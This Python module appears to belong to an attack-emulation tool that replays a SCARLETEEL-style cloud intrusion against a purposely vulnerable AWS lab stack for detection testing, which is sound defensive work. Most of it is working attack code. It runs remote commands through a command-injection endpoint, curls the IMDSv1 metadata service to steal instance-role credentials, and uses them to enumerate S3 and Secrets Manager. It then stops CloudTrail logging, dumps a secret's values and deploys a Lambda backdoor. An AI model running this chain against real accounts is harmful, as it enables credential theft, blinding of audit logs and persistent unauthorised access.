"""
SCARLETEEL 2.0 — attack execution module.

Exposes run(outputs, region) as the entry point called by the
run_emulation_attack Celery task.  All metadata (phase_count, display_name,
tier, etc.) lives in MANIFEST.py — this module contains only the attack logic.

The attack chain is executed against the live Pulumi-provisioned stack.  It is
self-contained: it receives the stack outputs (not a pulumi subprocess) and the
deployment region, performs container RCE against the vulnerable EC2 instance,
steals the instance-role credentials via IMDSv1, and then pivots to boto3 using
those stolen credentials for all subsequent cloud-side phases.

Phase 1 — Initial Access:    Container RCE via the exposed /cmd endpoint;
                             cryptominer decoy dropped (T1190, T1496).
Phase 2 — Credential Access: IMDSv1 metadata theft of the instance role's
                             temporary credentials (T1552.005).
Phase 3 — Discovery:         IAM / S3 / Secrets Manager enumeration with the
                             stolen credentials (T1087.004, T1580).
Phase 4 — Defense Evasion:   CloudTrail StopLogging to blind detections
                             (T1562.008).
Phase 5 — Lateral Movement:  Retrieve the Secrets Manager bait secret — the
                             lateral-movement credential target (T1550.001).
Phase 6 — Persistence:       Deploy a Lambda backdoor using the over-privileged
                             Lambda execution role (T1098).
"""

import io
import json
import logging
import time
import zipfile

import boto3
import botocore.exceptions
import requests

logger = logging.getLogger(__name__)

# Port the vulnerable web application listens on (set in the infra UserData).
VULN_APP_PORT = 8080

# IMDSv1 endpoint reachable only from inside the EC2 instance.
IMDS_BASE = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"


# ---------------------------------------------------------------------------
# Output helpers — printed to stdout so the Celery task streams them to the
# EmulationRun record.
# ---------------------------------------------------------------------------

def _banner(msg: str) -> None:
    """Print a section banner."""
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def _step(msg: str) -> None:
    """Print an indented step line."""
    print(f"\n[*] {msg}")


# ---------------------------------------------------------------------------
# RCE / container helpers
# ---------------------------------------------------------------------------

def _exploit_rce(target_url: str, cmd: str, timeout: int = 30) -> str | None:
    """
    Run a shell command on the vulnerable container via its command-injection
    endpoint.

    The intentionally vulnerable web application exposes POST /cmd which executes
    the `cmd` form field on the host and returns stdout in the response body.

    Args:
        target_url: Base URL of the vulnerable app (http://<ip>:8080).
        cmd:        Shell command to execute inside the container.
        timeout:    HTTP timeout in seconds.

    Returns:
        The command's stdout as a string, or None if the request failed.
    """
    try:
        resp = requests.post(f"{target_url}/cmd", data={"cmd": cmd}, timeout=timeout)
        return resp.text
    except requests.RequestException as exc:
        print(f"    -> HTTP exploit error: {exc}")
        return None


def _wait_for_container(target_url: str, max_wait: int = 300, interval: int = 10) -> bool:
    """
    Poll the /health endpoint until the vulnerable container is serving.

    The EC2 UserData installs Docker and starts the container on boot, which
    takes a couple of minutes after the instance reaches running state.

    Args:
        target_url: Base URL of the vulnerable app.
        max_wait:   Maximum seconds to wait before giving up.
        interval:   Seconds between polls.

    Returns:
        True once /health returns 200, False if max_wait is exceeded.
    """
    print(f"    Waiting for vulnerable container at {target_url} ...")
    elapsed = 0
    while elapsed < max_wait:
        try:
            resp = requests.get(f"{target_url}/health", timeout=5)
            if resp.status_code == 200:
                print(f"    Container is live after ~{elapsed}s.")
                return True
        except requests.RequestException:
            pass
        time.sleep(interval)
        elapsed += interval
    print(f"    Container not ready after {max_wait}s.")
    return False


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Execute the full SCARLETEEL emulation against the provisioned stack.

    Args:
        outputs: Pulumi stack outputs for this emulation stack.  Expected keys:
                 vuln_instance_ip, target_bucket_name, cloudtrail_arn,
                 secrets_manager_arn, lambda_role_arn.
        region:  AWS region the stack was deployed in (from Stack.region).

    Raises:
        RuntimeError: If the vulnerable instance IP is missing or the container
                      never becomes reachable — the attack cannot proceed.
    """
    logger.info("SCARLETEEL 2.0 emulation starting (region=%s)", region)

    target_ip = outputs.get("vuln_instance_ip", "")
    if not target_ip:
        raise RuntimeError(
            "vuln_instance_ip missing from stack outputs — cannot run attack."
        )

    target_url = f"http://{target_ip}:{VULN_APP_PORT}"

    _banner("SCARLETEEL 2.0 Attack Emulation")
    print(f"  Target IP    : {target_ip}")
    print(f"  Target URL   : {target_url}")
    print(f"  Region       : {region}")
    print(f"  TF-state bkt : {outputs.get('target_bucket_name', '(unknown)')}")
    print(f"  Secret ARN   : {outputs.get('secrets_manager_arn', '(unknown)')}")

    if not _wait_for_container(target_url):
        raise RuntimeError("Vulnerable container never became ready — aborting.")

    # Phase 1 + 2 establish RCE and steal the instance-role credentials.
    _phase_1_initial_access(target_url)
    stolen_creds = _phase_2_credential_access(target_url, region)

    if not stolen_creds:
        print("\n[!] No credentials stolen — cloud-side phases cannot run. Aborting.")
        raise RuntimeError("IMDSv1 credential theft failed; no stolen credentials.")

    # Pivot to boto3 using the stolen instance-role credentials.
    session = boto3.Session(
        aws_access_key_id=stolen_creds["AccessKeyId"],
        aws_secret_access_key=stolen_creds["SecretAccessKey"],
        aws_session_token=stolen_creds["Token"],
        region_name=region,
    )

    _phase_3_discovery(session, outputs)
    _phase_4_defense_evasion(session, outputs)
    _phase_5_lateral_movement(session, outputs)
    _phase_6_persistence(session, outputs, region)

    _banner("SCARLETEEL 2.0 Emulation Complete")
    print("  CloudTrail events generated: ListBuckets, ListObjectsV2, GetObject,")
    print("    GetRole, ListAttachedRolePolicies, ListSecrets, GetSecretValue,")
    print("    DescribeTrails, StopLogging, CreateFunction")
    logger.info("SCARLETEEL 2.0 emulation complete")


# ---------------------------------------------------------------------------
# Phase 1 — Initial Access: container RCE + cryptominer decoy
# ---------------------------------------------------------------------------

def _phase_1_initial_access(target_url: str) -> None:
    """
    Phase 1 — Initial Access: exploit the vulnerable container via RCE.

    Confirms code execution with `id`/`uname`, then drops a cryptominer decoy
    (XMRig simulation — no real mining) to mirror the SCARLETEEL campaign's
    resource-hijacking behaviour.

    Args:
        target_url: Base URL of the vulnerable app.
    """
    _banner("Phase 1 — Initial Access: Container RCE (T1190, T1496)")

    _step("Confirming remote code execution...")
    whoami = _exploit_rce(target_url, "id; uname -a")
    if whoami:
        print(f"    -> RCE confirmed: {whoami.strip().splitlines()[0]}")
    else:
        print("    -> RCE command returned no output (continuing).")

    _step("Dropping cryptominer decoy via RCE (T1496)...")
    _exploit_rce(target_url, """cat > /tmp/config_background.json << 'MINERCONF'
{"pools":[{"url":"stratum+tcp://pool.example.com:3333","user":"wallet_placeholder","pass":"x"}],"background":true}
MINERCONF""")
    miner_out = _exploit_rce(target_url, """cat > /tmp/miner.sh << 'MINERSCRIPT'
#!/bin/bash
echo '[*] XMRig miner simulation started'
echo '[*] Loading config from /tmp/config_background.json'
echo '[*] Mining process simulated (no actual mining)'
MINERSCRIPT
chmod +x /tmp/miner.sh && /tmp/miner.sh""")
    if miner_out:
        print(f"    -> Miner decoy: {miner_out.strip().splitlines()[-1]}")
    print("[Phase 1] Complete")


# ---------------------------------------------------------------------------
# Phase 2 — Credential Access: IMDSv1 theft
# ---------------------------------------------------------------------------

def _phase_2_credential_access(target_url: str, region: str) -> dict | None:
    """
    Phase 2 — Credential Access: steal the instance-role credentials via IMDSv1.

    Uses the RCE foothold to curl the instance metadata service from inside the
    EC2 host (IMDSv1 requires no token pre-flight, so it is reachable from any
    process on the instance).  Returns the parsed credential payload.

    Args:
        target_url: Base URL of the vulnerable app.
        region:     AWS region (used to configure the in-container AWS CLI).

    Returns:
        Dict with AccessKeyId / SecretAccessKey / Token, or None on failure.
    """
    _banner("Phase 2 — Credential Access: IMDSv1 Theft (T1552.005)")

    _step("Discovering the instance IAM role via IMDSv1...")
    role_name = _exploit_rce(target_url, f"curl -s {IMDS_BASE}")
    if not role_name or not role_name.strip():
        print("[!] Failed to discover IAM role via IMDS — instance may lack a role.")
        return None
    role_name = role_name.strip()
    print(f"    -> Discovered IAM role: {role_name}")

    _step("Stealing temporary credentials from IMDSv1...")
    creds_raw = _exploit_rce(target_url, f"curl -s {IMDS_BASE}{role_name}")
    if not creds_raw:
        print("[!] Failed to fetch IMDS credentials.")
        return None

    try:
        creds = json.loads(creds_raw)
    except json.JSONDecodeError as exc:
        print(f"[!] Failed to parse IMDS credential JSON: {exc}")
        print(f"    Raw output: {creds_raw[:200]}")
        return None

    if "AccessKeyId" not in creds or "Token" not in creds:
        print(f"[!] Incomplete IMDS credential payload: {list(creds.keys())}")
        return None

    print(f"    -> AccessKeyId : {creds['AccessKeyId']}")
    print(f"    -> Expiration  : {creds.get('Expiration', 'N/A')}")

    # Replicate the SCARLETEEL in-container credential-exfil pipeline so the
    # behaviour appears in container logs / EDR telemetry.
    _step("Replicating SCARLETEEL credential pipeline inside the container...")
    _exploit_rce(target_url, f"""cd /tmp && mkdir -p aws_stolen && cd aws_stolen && \
curl -s {IMDS_BASE}{role_name} -o raw.json && \
cat raw.json | sed s/,/\\n/g | grep 'AccessKeyId\\|SecretAccessKey\\|Token' > grepped.txt && \
aws configure set region {region} 2>/dev/null || true""")
    print("[Phase 2] Complete")
    return creds


# ---------------------------------------------------------------------------
# Phase 3 — Discovery: IAM / S3 / Secrets Manager enumeration
# ---------------------------------------------------------------------------

def _phase_3_discovery(session: boto3.Session, outputs: dict) -> None:
    """
    Phase 3 — Discovery: map the blast radius with the stolen credentials.

    Enumerates the current identity, attached IAM policies, S3 buckets and
    their objects, and Secrets Manager secrets.

    Args:
        session: boto3 session built from the stolen instance-role credentials.
        outputs: Stack outputs dict.
    """
    _banner("Phase 3 — Discovery: IAM / S3 / Secrets Manager (T1087.004, T1580)")

    sts = session.client("sts")
    try:
        identity = sts.get_caller_identity()
        print(f"  [+] Operating as: {identity['Arn']}")
    except botocore.exceptions.ClientError as exc:
        print(f"  [!] get_caller_identity failed: {exc}")

    _step("Enumerating S3 buckets and objects...")
    s3 = session.client("s3")
    try:
        buckets = s3.list_buckets().get("Buckets", [])
        print(f"  [+] Discovered {len(buckets)} S3 bucket(s).")
        for bucket in buckets:
            name = bucket["Name"]
            if "scarleteel" not in name:
                continue
            try:
                objs = s3.list_objects_v2(Bucket=name).get("Contents", [])
                print(f"       -> {name}: {len(objs)} object(s)")
                for obj in objs:
                    print(f"          - {obj['Key']} ({obj['Size']} bytes)")
            except botocore.exceptions.ClientError as exc:
                print(f"       -> {name}: access error {exc.response['Error']['Code']}")
    except botocore.exceptions.ClientError as exc:
        print(f"  [!] S3 enumeration failed: {exc}")

    _step("Enumerating Secrets Manager secrets...")
    sm = session.client("secretsmanager")
    try:
        secrets = sm.list_secrets().get("SecretList", [])
        print(f"  [+] Discovered {len(secrets)} secret(s).")
        for secret in secrets:
            print(f"       -> {secret['Name']} (ARN: {secret['ARN']})")
    except botocore.exceptions.ClientError as exc:
        print(f"  [!] Secrets Manager enumeration failed: {exc}")

    print("[Phase 3] Complete")


# ---------------------------------------------------------------------------
# Phase 4 — Defense Evasion: disable CloudTrail
# ---------------------------------------------------------------------------

def _phase_4_defense_evasion(session: boto3.Session, outputs: dict) -> None:
    """
    Phase 4 — Defense Evasion: stop CloudTrail logging to blind detections.

    Prefers the trail named in the stack outputs (cloudtrail_arn); falls back to
    describe_trails and matching on the scarleteel naming convention.  Handled
    gracefully when no trail exists (e.g. a partial stack without CloudTrail).

    Args:
        session: boto3 session from the stolen credentials.
        outputs: Stack outputs dict (cloudtrail_arn key).
    """
    _banner("Phase 4 — Defense Evasion: CloudTrail StopLogging (T1562.008)")

    ct = session.client("cloudtrail")
    trail_arn = outputs.get("cloudtrail_arn", "")

    if not trail_arn:
        try:
            trails = ct.describe_trails().get("trailList", [])
            match = next((t for t in trails if "scarleteel" in t["Name"]), None)
            trail_arn = match["TrailARN"] if match else ""
        except botocore.exceptions.ClientError as exc:
            print(f"  [!] describe_trails failed: {exc}")

    if not trail_arn:
        print("  [-] No CloudTrail trail found for this stack — skipping (Phase 4 no-op).")
        print("[Phase 4] Complete")
        return

    try:
        print(f"    -> Stopping trail: {trail_arn}")
        ct.stop_logging(Name=trail_arn)
        print("    -> SUCCESS: CloudTrail logging disabled.")
        print("    [!] Expected GuardDuty finding: Stealth:IAMUser/CloudTrailLoggingDisabled")
    except botocore.exceptions.ClientError as exc:
        print(f"  [!] stop_logging failed: {exc}")

    print("[Phase 4] Complete")


# ---------------------------------------------------------------------------
# Phase 5 — Lateral Movement: Secrets Manager bait secret
# ---------------------------------------------------------------------------

def _phase_5_lateral_movement(session: boto3.Session, outputs: dict) -> None:
    """
    Phase 5 — Lateral Movement: retrieve the Secrets Manager bait secret.

    The infra plants a secret containing application credentials (api_key,
    db_password) as the lateral-movement target.  Retrieving it simulates an
    attacker harvesting credentials to pivot into adjacent application/database
    systems (T1550.001 — Application Access Token).

    Args:
        session: boto3 session from the stolen credentials.
        outputs: Stack outputs dict (secrets_manager_arn key).
    """
    _banner("Phase 5 — Lateral Movement: Secrets Manager Theft (T1550.001)")

    secret_arn = outputs.get("secrets_manager_arn", "")
    if not secret_arn:
        print("  [-] No secrets_manager_arn in outputs — skipping (Phase 5 no-op).")
        print("[Phase 5] Complete")
        return

    sm = session.client("secretsmanager")
    try:
        print(f"    -> Retrieving secret: {secret_arn}")
        resp = sm.get_secret_value(SecretId=secret_arn)
        secret_string = resp.get("SecretString", "")
        try:
            parsed = json.loads(secret_string)
            print("    -> SUCCESS: Extracted lateral-movement credentials:")
            for key, value in parsed.items():
                print(f"       {key} : {value}")
        except json.JSONDecodeError:
            print(f"    -> SUCCESS: Retrieved secret (non-JSON): {secret_string[:80]}")
        print("    [!] Attacker would now pivot to the app/DB these credentials unlock.")
    except botocore.exceptions.ClientError as exc:
        print(f"  [!] get_secret_value failed: {exc}")

    print("[Phase 5] Complete")


# ---------------------------------------------------------------------------
# Phase 6 — Persistence: Lambda backdoor
# ---------------------------------------------------------------------------

def _phase_6_persistence(session: boto3.Session, outputs: dict, region: str) -> None:
    """
    Phase 6 — Persistence: deploy a Lambda backdoor.

    Uses the over-privileged Lambda execution role provisioned by the infra to
    create a function that, in a real intrusion, would grant persistent access
    that survives container restarts and cluster remediation (T1098).

    The deployment package is a minimal Python handler built in-memory.

    Args:
        session: boto3 session from the stolen credentials.
        outputs: Stack outputs dict (lambda_role_arn key).
        region:  AWS region (Lambda is a regional service).
    """
    _banner("Phase 6 — Persistence: Lambda Backdoor (T1098)")

    role_arn = outputs.get("lambda_role_arn", "")
    if not role_arn:
        print("  [-] No lambda_role_arn in outputs — skipping (Phase 6 no-op).")
        print("[Phase 6] Complete")
        return

    function_name = "mayatrail-scarleteel-backdoor"
    zip_bytes = _build_backdoor_zip()

    lam = session.client("lambda", region_name=region)
    try:
        print(f"    -> Creating backdoor function '{function_name}' with role {role_arn}")
        lam.create_function(
            FunctionName=function_name,
            Runtime="python3.12",
            Role=role_arn,
            Handler="index.handler",
            Code={"ZipFile": zip_bytes},
            Description="mayatrail emulation backdoor (benign)",
            Timeout=30,
            Tags={"MayaTrail": "scarleteel"},
        )
        print("    -> SUCCESS: Lambda backdoor deployed for persistence.")
        print("    [!] Expected detection: Lambda CreateFunction by a non-CI principal.")
    except botocore.exceptions.ClientError as exc:
        code = exc.response["Error"]["Code"]
        if code == "ResourceConflictException":
            print(f"    -> Backdoor '{function_name}' already exists (idempotent re-run).")
        else:
            print(f"  [!] create_function failed: {exc}")

    print("[Phase 6] Complete")


def _build_backdoor_zip() -> bytes:
    """
    Build a minimal Lambda deployment package in memory.

    The handler is intentionally benign — it only echoes the event back.  In a
    real intrusion this is where persistence/exfiltration logic would live; the
    emulation's value is the CreateFunction control-plane event, not the code.

    Returns:
        Raw bytes of a zip archive containing index.py.
    """
    handler_src = (
        "def handler(event, context):\n"
        "    # Benign emulation backdoor — echoes the invocation event.\n"
        "    return {'status': 'mayatrail-emulation-backdoor', 'event': event}\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("index.py", handler_src)
    return buf.getvalue()